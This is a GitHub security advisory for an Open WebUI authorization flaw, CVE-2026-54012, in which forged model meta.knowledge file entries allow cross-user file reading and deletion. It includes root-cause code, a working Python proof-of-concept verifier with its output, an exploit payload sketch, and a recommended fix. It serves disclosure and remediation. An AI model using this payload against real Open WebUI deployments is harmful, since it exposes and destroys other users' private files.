# [H] Open WebUI: Forged model meta.knowledge allows cross-user file read and deletion

## Summary
Severity: High
Advisory: GHSA-vjqm-6gcc-62cr
CVE: CVE-2026-54012
CWE: CWE-284, CWE-285, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-vjqm-6gcc-62cr
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
## Summary

Open WebUI lets a user who can create, update, or import workspace models store arbitrary `meta.knowledge` entries on their model without checking whether they own or can read the referenced files. Open WebUI then treats `meta.knowledge` entries of type `file` as an authorization source in two places: the built-in `view_file` tool reads the file's extracted text, and `has_access_to_file()`'s model branch authorizes the file content and file delete endpoints. A malicious model owner can therefore attach another user's file ID to their model metadata and read or delete that private file.

## Impact

Security boundary crossed: file confidentiality and integrity.

An authenticated attacker needs the `workspace.models` or `workspace.models_import` permission (or write access to an existing model) and a victim file ID. With those, for a file they do not own and cannot otherwise read, the attacker can:

- read the file's extracted text (up to `100000` characters per `view_file` call from `file.data.content`),
- read the file's content via `GET /api/v1/files/{id}/content`, and
- delete the file via `DELETE /api/v1/files/{id}`.

## Root Cause

`ModelMeta` allows extra metadata fields and `ModelForm` accepts that metadata without a validator for `meta.knowledge` file access:

```python
# backend/open_webui/models/models.py
class ModelForm(BaseModel):
    model_config = ConfigDict(extra='ignore')

    id: str
    base_model_id: Optional[str] = None
    name: str
    meta: ModelMeta
    params: ModelParams
```

Model creation only checks the caller's model-workspace permission and then stores the form data:

```python
# backend/open_webui/routers/models.py
if user.role != 'admin' and not await has_permission(
    user.id, 'workspace.models', request.app.state.config.USER_PERMISSIONS, db=db
):
    raise HTTPException(...)

model = await Models.insert_new_model(form_data, user.id, db=db)
```

The insert sink persists the supplied `meta`:

```python
# backend/open_webui/models/models.py
result = Model(
    **{
        **form_data.model_dump(exclude={'access_grants'}),
        'user_id': user_id,
        ...
    }
)
```

When built-in tools are assembled, `meta.knowledge` is passed through as `__model_knowledge__`, and any `file` entry enables `view_file`:

```python
# backend/open_webui/utils/tools.py
model_knowledge = model.get('info', {}).get('meta', {}).get('knowledge', [])
...
knowledge_types = {item.get('type') for item in model_knowledge}
if 'file' in knowledge_types or 'collection' in knowledge_types:
    builtin_functions.append(view_file)
```

`view_file` treats matching `__model_knowledge__` file IDs as authorization, before `has_access_to_file()`:

```python
# backend/open_webui/tools/builtin.py
if (
    file.user_id != user_id
    and user_role != 'admin'
    and not any(
        item.get('type') == 'file' and item.get('id') == file_id for item in (__model_knowledge__ or [])
    )
    and not await has_access_to_file(...)
):
    return json.dumps({'error': 'File not found'})
```

The same forged `meta.knowledge` is also trusted outside the tool path. `has_access_to_file()` iterates the caller's accessible models and returns true when a model's `meta.knowledge` contains the requested file ID:

```python
# backend/open_webui/utils/access_control/files.py
for model in await Models.get_models_by_user_id(user.id, permission=access_type, db=db):
    knowledge_items = getattr(model.meta, 'knowledge', None) or []
    for item in knowledge_items:
        if isinstance(item, dict) and item.get('type') == 'file' and item.get('id') == file.id:
            return True
```

This branch is not restricted to read, so it also satisfies the `write` check that `DELETE /api/v1/files/{id}` performs. The same missing validation applies to the import path (`POST /api/v1/models/import`) and the update path, not only create.

## PoC

```python
#!/usr/bin/env python3
"""
Verifier for forged model meta.knowledge file entries reaching builtin tools.

The proof executes:
  - the real Models.insert_new_model() sink with a forged meta.knowledge entry
  - the real builtin view_file() authorization branch

Fake DB/model adapters are used only to avoid requiring a live Open WebUI
server. The security-sensitive code under test is Open WebUI application code.
"""

from __future__ import annotations

import asyncio
import ast
import json
import os
import sys
import types
from pathlib import Path
from types import SimpleNamespace

REPO = Path(__file__).resolve().parents[1]
BUILTIN_TOOLS = REPO / "backend/open_webui/tools/builtin.py"


def prepare_imports() -> None:
    sys.path.insert(0, str(REPO / "backend"))
    os.environ["VECTOR_DB"] = "none"

    class DummyTyper:
        def command(self, *args, **kwargs):
            return lambda fn: fn

    sys.modules.setdefault(
        "typer",
        types.SimpleNamespace(
            Typer=lambda *args, **kwargs: DummyTyper(),
            Option=lambda *args, **kwargs: None,
            echo=lambda *args, **kwargs: None,
            Exit=Exception,
        ),
    )
    sys.modules.setdefault("uvicorn", types.SimpleNamespace(run=lambda *args, **kwargs: None))


class FakeDb:
    def __init__(self):
        self.added = []
        self.committed = False
        self.refreshed = False

    def add(self, row):
        self.added.append(row)

    async def commit(self):
        self.committed = True

    async def refresh(self, row):
        self.refreshed = True


class FakeDbContext:
    def __init__(self, db):
        self.db = db

    async def __aenter__(self):
        return self.db

    async def __aexit__(self, exc_type, exc, tb):
        return False


async def verify_model_insert_accepts_victim_file(victim_file_id: str):
    import open_webui.models.models as models_module

    fake_db = FakeDb()
    original_context = models_module.get_async_db_context
    original_set_grants = models_module.AccessGrants.set_access_grants
    original_to_model = models_module.Models._to_model_model

    async def fake_set_access_grants(*args, **kwargs):
        return True

    async def fake_to_model(self, model, access_grants=None, db=None):
        return SimpleNamespace(
            id=model.id,
            user_id=model.user_id,
            base_model_id=model.base_model_id,
            name=model.name,
            params=model.params,
            meta=model.meta,
            access_grants=[],
            is_active=model.is_active,
            created_at=model.created_at,
            updated_at=model.updated_at,
        )

    try:
        models_module.get_async_db_context = lambda db=None: FakeDbContext(fake_db)
        models_module.AccessGrants.set_access_grants = fake_set_access_grants
        models_module.Models._to_model_model = types.MethodType(fake_to_model, models_module.Models)

        inserted = await models_module.Models.insert_new_model(
            models_module.ModelForm(
                id="attacker-model",
                base_model_id="gpt-vision-base",
                name="Attacker Model",
                params={},
                meta={
                    "knowledge": [
                        {
                            "id": victim_file_id,
                            "type": "file",
                            "name": "victim-private.txt",
                        }
                    ],
                    "builtinTools": {"knowledge": True},
                },
            ),
            user_id="attacker",
        )
    finally:
        models_module.get_async_db_context = original_context
        models_module.AccessGrants.set_access_grants = original_set_grants
        models_module.Models._to_model_model = original_to_model

    stored_meta = [getattr(row, "meta", None) for row in fake_db.added]
    stored_knowledge_ids = [
        item.get("id")
        for meta in stored_meta
        for item in ((meta or {}).get("knowledge") or [])
    ]

    return {
        "insert_returned_model": bool(inserted),
        "db_commit_called": fake_db.committed,
        "stored_user_ids": [getattr(row, "user_id", None) for row in fake_db.added],
        "stored_model_ids": [getattr(row, "id", None) for row in fake_db.added],
        "stored_knowledge_file_ids": stored_knowledge_ids,
    }


async def verify_view_file_trusts_model_knowledge(victim_file_id: str):
    class FakeFiles:
        looked_up_ids = []

        async def get_file_by_id(self, file_id, db=None):
            self.looked_up_ids.append(file_id)
            if file_id == victim_file_id:
                return SimpleNamespace(
                    id=victim_file_id,
                    user_id="victim",
                    filename="victim-private.txt",
                    data={"content": "PRIVATE_MODEL_KNOWLEDGE_SECRET"},
                    created_at=1,
                    updated_at=2,
                )
            return None

    async def fake_has_access_to_file(file_id, access_type, user, db=None):
        return False

    class FakeUserModel:
        def __init__(self, **kwargs):
            self.__dict__.update(kwargs)

    fake_files = FakeFiles()
    fake_files_module = types.SimpleNamespace(Files=fake_files)
    fake_file_acl_module = types.SimpleNamespace(has_access_to_file=fake_has_access_to_file)

    original_files_module = sys.modules.get("open_webui.models.files")
    original_acl_module = sys.modules.get("open_webui.utils.access_control.files")

    try:
        sys.modules["open_webui.models.files"] = fake_files_module
        sys.modules["open_webui.utils.access_control.files"] = fake_file_acl_module

        source = BUILTIN_TOOLS.read_text(encoding="utf-8")
        tree = ast.parse(source, filename=str(BUILTIN_TOOLS))
        selected = [
            node
            for node in tree.body
            if isinstance(node, ast.AsyncFunctionDef) and node.name == "view_file"
        ]
        if len(selected) != 1:
            raise RuntimeError("could not find view_file")
        module = ast.Module(body=selected, type_ignores=[])
        ast.fix_missing_locations(module)
        ns = {
            "json": json,
            "Optional": __import__("typing").Optional,
            "Request": object,
            "UserModel": FakeUserModel,
            "log": SimpleNamespace(exception=lambda *args, **kwargs: None),
            "MAX_VIEW_FILE_CHARS": 100_000,
            "DEFAULT_VIEW_FILE_MAX_CHARS": 10_000,
        }
        exec(compile(module, str(BUILTIN_TOOLS), "exec"), ns)
        view_file = ns["view_file"]

        denied_without_model_knowledge = await view_file(
            victim_file_id,
            __request__=SimpleNamespace(),
            __user__={"id": "attacker", "role": "user", "name": "attacker", "email": "a@example.test"},
            __model_knowledge__=[],
        )
        allowed_with_model_knowledge = await view_file(
            victim_file_id,
            __request__=SimpleNamespace(),
            __user__={"id": "attacker", "role": "user", "name": "attacker", "email": "a@example.test"},
            __model_knowledge__=[{"id": victim_file_id, "type": "file"}],
        )
    finally:
        if original_files_module is not None:
            sys.modules["open_webui.models.files"] = original_files_module
        else:
            sys.modules.pop("open_webui.models.files", None)
        if original_acl_module is not None:
            sys.modules["open_webui.utils.access_control.files"] = original_acl_module
        else:
            sys.modules.pop("open_webui.utils.access_control.files", None)

    denied = json.loads(denied_without_model_knowledge)
    allowed = json.loads(allowed_with_model_knowledge)
    return {
        "file_ids_looked_up": fake_files.looked_up_ids,
        "without_model_knowledge": denied,
        "with_forged_model_knowledge": allowed,
        "private_content_disclosed": allowed.get("content") == "PRIVATE_MODEL_KNOWLEDGE_SECRET",
    }


async def main() -> None:
    prepare_imports()
    victim_file_id = "victim-private-file"

    insert_sink = await verify_model_insert_accepts_victim_file(victim_file_id)
    tool_read = await verify_view_file_trusts_model_knowledge(victim_file_id)

    result = {
        "confirmed": (
            insert_sink["insert_returned_model"] is True
            and insert_sink["stored_user_ids"] == ["attacker"]
            and insert_sink["stored_knowledge_file_ids"] == [victim_file_id]
            and tool_read["without_model_knowledge"].get("error") == "File not found"
            and tool_read["private_content_disclosed"] is True
        ),
        "attacker_user_id": "attacker",
        "victim_user_id": "victim",
        "victim_file_id": victim_file_id,
        "attacker_owns_file": False,
        "model_insert_sink": insert_sink,
        "tool_read": tool_read,
        "source": {
            "insert_sink": "backend/open_webui/models/models.py:Models.insert_new_model",
            "tool_injection": "backend/open_webui/utils/tools.py:get_builtin_tools passes model meta.knowledge as __model_knowledge__",
            "read_sink": "backend/open_webui/tools/builtin.py:view_file",
        },
    }
    print(json.dumps(result, indent=2, sort_keys=True))
    if not result["confirmed"]:
        raise SystemExit(1)


if __name__ == "__main__":
    asyncio.run(main())
```

The PoC executes the real `Models.insert_new_model()` sink and the real `view_file()` authorization branch with fake database/file adapters. It first confirms that the attacker-owned model stores a forged victim file ID in `meta.knowledge`, then confirms `view_file()` denies the same victim file without model knowledge but discloses content when the forged model knowledge entry is present.

Result:

```json
{
  "attacker_owns_file": false,
  "attacker_user_id": "attacker",
  "confirmed": true,
  "model_insert_sink": {
    "db_commit_called": true,
    "insert_returned_model": true,
    "stored_knowledge_file_ids": [
      "victim-private-file"
    ],
    "stored_model_ids": [
      "attacker-model"
    ],
    "stored_user_ids": [
      "attacker"
    ]
  },
  "tool_read": {
    "private_content_disclosed": true,
    "with_forged_model_knowledge": {
      "content": "PRIVATE_MODEL_KNOWLEDGE_SECRET",
      "filename": "victim-private.txt",
      "id": "victim-private-file"
    },
    "without_model_knowledge": {
      "error": "File not found"
    }
  },
  "victim_file_id": "victim-private-file",
  "victim_user_id": "victim"
}
```

## Exploit Sketch

1. Attacker has permission to create or update workspace models.
2. Attacker creates a model with:

```json
{
  "meta": {
    "knowledge": [
      {
        "id": "VICTIM_FILE_ID",
        "type": "file",
        "name": "victim-private.txt"
      }
    ],
    "builtinTools": {
      "knowledge": true
    }
  }
}
```

3. Attacker chats with that model using native/built-in tools and invokes `view_file` for `VICTIM_FILE_ID`.
4. The tool returns the victim file's extracted text content despite the attacker not owning or otherwise having access to the file.

## Recommended Fix

Validate `meta.knowledge` on every model write path: create, update, and import. For entries with `type == "file"`, require direct ownership, admin role, or `has_access_to_file(file_id, 'read', user, db=db)` before storing the entry. Validate the import payload before its surrounding try/except so a rejection surfaces as `403`, not `500`.

Do not let `view_file()` treat `__model_knowledge__` as an authorization bypass; it should still enforce ownership/admin/`has_access_to_file()` per file ID. File deletion should require ownership, admin, or explicit write/delete access, not a read-derived model association.

## Consolidation

Per our Report Handling policy this consolidates independent reports of the same model `meta.knowledge` file-ID laundering flaw:

- Read via forged `meta.knowledge` on model create, through the built-in `view_file` tool: @0xEr3n (earliest filing).
- Distinct paths demonstrated by @5yu4n: the import endpoint (`POST /api/v1/models/import`), and cross-user read and deletion through the file API (`GET` / `DELETE /api/v1/files/{id}`) via `has_access_to_file()`'s model branch.

Fix validates `meta.knowledge` ownership on create, update, and import; blocking the forged entry closes both read and delete. One CVE for the consolidated advisory.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-vjqm-6gcc-62cr
- https://nvd.nist.gov/vuln/detail/CVE-2026-54012
- https://github.com/advisories/GHSA-vjqm-6gcc-62cr
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2761.yaml
- https://pypi.org/project/open-webui
